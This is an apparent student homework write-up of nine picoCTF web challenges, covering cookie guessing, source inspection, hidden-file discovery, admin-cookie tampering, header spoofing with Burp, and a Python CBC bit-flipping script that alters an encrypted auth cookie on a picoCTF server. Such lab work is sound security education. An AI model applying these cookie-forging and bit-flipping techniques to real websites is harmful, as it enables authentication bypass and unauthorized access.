# HW2

Ex 1: Cookies
We open the cookies editor and in the field of value we start trying different numbers until the flag shows up.

<img width="498" alt="Captura de pantalla 2024-04-17 a la(s) 10 00 59" src="https://github.com/emiliasaenz/HW2/assets/143628612/f040f9c0-bb55-4622-a78c-c06100cb3236">


I tried until the number 18 and the flag showed up

<img width="760" alt="Captura de pantalla 2024-04-17 a la(s) 10 04 38" src="https://github.com/emiliasaenz/HW2/assets/143628612/20ff3685-70f1-4332-8a4d-310a487b2960">

Ex 2: Inspector 

First we open the page source code and there we can find the first third of the the flag that corresponds to the part of HTML

<img width="578" alt="Captura de pantalla 2024-04-17 a la(s) 21 47 02" src="https://github.com/emiliasaenz/HW2/assets/143628612/112c5e9a-98b7-485e-b385-1257bea1a5ad">

Then we open inspect with a right click on the page, we go to source and there we find the second third of the flag on the ccs file

<img width="845" alt="Captura de pantalla 2024-04-17 a la(s) 21 49 35" src="https://github.com/emiliasaenz/HW2/assets/143628612/c7890dae-da9a-43d4-9d33-59b12008a9a9">

And finally we go to the java script file and we find the last part of the flag

<img width="841" alt="Captura de pantalla 2024-04-17 a la(s) 21 51 02" src="https://github.com/emiliasaenz/HW2/assets/143628612/f1c1c932-e3d5-4dff-af71-4455d740ff50">

Ex 3: Scavanger hunt

First we open the page source code and there we can find the first third of the the flag that corresponds to the part of HTML

<img width="523" alt="Captura de pantalla 2024-04-17 a la(s) 21 54 02" src="https://github.com/emiliasaenz/HW2/assets/143628612/76346e5c-62b4-4376-8ee9-653d274921a2">

Then we open inspect with a right click on the page, we go to source and there we find the second third of the flag on the ccs file

<img width="860" alt="Captura de pantalla 2024-04-17 a la(s) 21 55 16" src="https://github.com/emiliasaenz/HW2/assets/143628612/e6218897-3e1b-49ae-870b-6512314edb5e">

For the third part, we write on the search bar of the page robots.txt
Robots.txt controls the crawling and the overview of all existing URLs of your domain.
There we find the third part of the flag 

<img width="572" alt="Captura de pantalla 2024-04-17 a la(s) 22 33 02" src="https://github.com/emiliasaenz/HW2/assets/143628612/29ed6610-226e-4a24-abd2-537c0bdb3e77">

As the next hints suggest, we enter on the search bar .htaccess, that is used to configure additional features for websites hosted on Apache web server. There we find the fourth part of the flag

<img width="628" alt="Captura de pantalla 2024-04-17 a la(s) 22 37 17" src="https://github.com/emiliasaenz/HW2/assets/143628612/0df46236-0056-4d5c-b003-e51fbfd251cd">

And finally we write .DS_Store. The DS_Store files are automatically generated every time the explorer comes into contact with a drive and are always hidden. There we find the last part of the flag 

<img width="579" alt="Captura de pantalla 2024-04-17 a la(s) 22 40 51" src="https://github.com/emiliasaenz/HW2/assets/143628612/001cff63-4535-406a-884f-84336c4ab3ea">


Ex 4: Bookmarklet

First we start running the instance. Then on the new page that is displayed we find a code. 

<img width="693" alt="Captura de pantalla 2024-04-17 a la(s) 22 45 52" src="https://github.com/emiliasaenz/HW2/assets/143628612/02bddcc2-ff8f-4301-bc70-d885da053fe4">

We run this code in the console and the flag shows up

<img width="826" alt="Captura de pantalla 2024-04-17 a la(s) 22 46 51" src="https://github.com/emiliasaenz/HW2/assets/143628612/2632dbfb-95e4-4ae7-870f-14acbff659bf">


Ex 5: Web Decode 

First we start running the instance. We open the new page and then click on inspect

On the Element tab we find a part that says notify true, that seems to be the flag that is encrypted 

<img width="675" alt="Captura de pantalla 2024-04-17 a la(s) 22 54 41" src="https://github.com/emiliasaenz/HW2/assets/143628612/4b795832-09a6-4b5f-8120-c98e3cad0c72">

With an online decoder we enter the text and the flag shows up

<img width="630" alt="Captura de pantalla 2024-04-17 a la(s) 22 58 49" src="https://github.com/emiliasaenz/HW2/assets/143628612/50ea51a5-f466-4d7f-9a47-014f97639651">

Ex 6: More cookies

We open the cookies of the new page. There we find an auth_name section with a value that is the encrypted flag

<img width="628" alt="Captura de pantalla 2024-04-17 a la(s) 23 06 38" src="https://github.com/emiliasaenz/HW2/assets/143628612/2918db85-0f9f-41dc-90a8-8bec214979c8">

To decrypt the flag:
The instructions gives a clue that is CBC (Cipher Block Chaining) and the way to attack this is with bit flipping 
We write a code to decrypt the flag:

import requests
import base64

# Configuration for the target server.
session = requests.Session()
initial_response = session.get("http://mercury.picoctf.net:10868/")
cookie_value = session.cookies.get('auth_name')

# Perform double decoding from base64 to get the raw cookie data.
decoded_first = base64.b64decode(cookie_value)
raw_cookie_data = base64.b64decode(decoded_first)

def find_flag():
    # Explore each byte in the cookie
    for byte_index in range(0,128):
        # Modify each bit within the byte
        for bit_index in range(8):

            modified_byte = raw_cookie_data[byte_index] ^ 1 << bit_index
            modified_cookie = (raw_cookie_data[:byte_index] +
                               modified_byte.to_bytes(1, byteorder='big') +
                               raw_cookie_data[byte_index + 1:])

            # Encode the modified cookie twice as per the server's requirement
            modified_encoded = base64.b64encode(base64.b64encode(modified_cookie)).decode('utf-8')

            # Send the modified cookie to the server
            modified_response = requests.get("http://mercury.picoctf.net:10868/", cookies={'auth_name': modified_encoded})

            # Check the server's response for the flag pattern
            if "picoCTF{" in modified_response.text:
                print(modified_response.text)

# Run the exploit function
find_flag()


This code is based on: https://www.google.com/search?client=safari&rls=en&q=more+cookies+picoctf&ie=UTF-8&oe=UTF-8#fpstate=ive&vld=cid:40870205,vid:Fs3EbH-Wdhc,st:0

The code deploys a page where we can find the flag

<img width="956" alt="Captura de pantalla 2024-04-18 a la(s) 00 10 17" src="https://github.com/emiliasaenz/HW2/assets/143628612/893981b9-b23b-4817-b55d-604e1b6144da">

Ex 7: Logon

We can login as Joe and a random password but it doesnt show the flag
We enter in inspect and go to the application tab and there we can see all the users and their passwords, including the administrator, where we can see that the value is in false

<img width="1348" alt="Captura de pantalla 2024-04-18 a la(s) 00 16 36" src="https://github.com/emiliasaenz/HW2/assets/143628612/672040e0-836c-46c7-a712-bf80e8c4dd31">

We change the false value with true and it shows the flag, because we have control of our cookies

<img width="783" alt="Captura de pantalla 2024-04-18 a la(s) 00 21 14" src="https://github.com/emiliasaenz/HW2/assets/143628612/6925bb11-bd1c-426e-84f7-9b00176f35fc">

Ex 8: Dont use client side

We go to the new page and click on inspect. On the tab of Sources we can see a file where the flag is in parts, so we just have to put them together in order to obtain the flag

<img width="599" alt="Captura de pantalla 2024-04-18 a la(s) 00 29 08" src="https://github.com/emiliasaenz/HW2/assets/143628612/80159da0-f3f4-41cf-a794-fb3785f8d4de">

Ex 9: Who are you?

For this I used Burp to intercept the requests. 
<img width="532" alt="Captura de pantalla 2024-04-18 a la(s) 01 23 43" src="https://github.com/emiliasaenz/HW2/assets/143628612/b4258eae-b122-4380-a58d-9c0bb41399bb">

We change User-Agent: PicoBrowser so it is from an official browser

<img width="466" alt="Captura de pantalla 2024-04-18 a la(s) 01 26 46" src="https://github.com/emiliasaenz/HW2/assets/143628612/0c7c7b18-8dc0-4af0-b717-7d19f2742605">

We add a header to : Referer: http://mercury.picoctf.net:1270 because it doesnt work if it comes from other sites

<img width="492" alt="Captura de pantalla 2024-04-18 a la(s) 01 28 36" src="https://github.com/emiliasaenz/HW2/assets/143628612/ac730f0f-7a61-43a1-a02e-7ed9546ffacf">

We add a header : Date: Wed, 01 Jan 2018 because it says that the page only worked until 2018

<img width="484" alt="Captura de pantalla 2024-04-18 a la(s) 01 30 36" src="https://github.com/emiliasaenz/HW2/assets/143628612/d20dba22-c572-4b97-b212-2f89a045366d">

We add a header : DNT: 1 for privacy

<img width="496" alt="Captura de pantalla 2024-04-18 a la(s) 01 31 33" src="https://github.com/emiliasaenz/HW2/assets/143628612/09ae1bea-5c7a-4526-a792-3712156873fd">

We add a header : X-Forwarded-For: 155.4.131.93 that is an ip address from sweden


<img width="503" alt="Captura de pantalla 2024-04-18 a la(s) 01 39 06" src="https://github.com/emiliasaenz/HW2/assets/143628612/be36137b-a25b-42ba-a523-8ad40190d4f3">

We add a last header: Accept-Language: sv that accepts swedish as a language
And finally the flag shows up

<img width="462" alt="Captura de pantalla 2024-04-18 a la(s) 01 41 24" src="https://github.com/emiliasaenz/HW2/assets/143628612/28bcb0c1-5604-4d86-9057-6ec86eb8bcff">

Summary of headers:

<img width="516" alt="Captura de pantalla 2024-04-18 a la(s) 01 41 56" src="https://github.com/emiliasaenz/HW2/assets/143628612/2935810e-ab99-4949-819e-ca1f39ee36be">


Based on: https://www.youtube.com/watch?v=su1XD3x5k_E



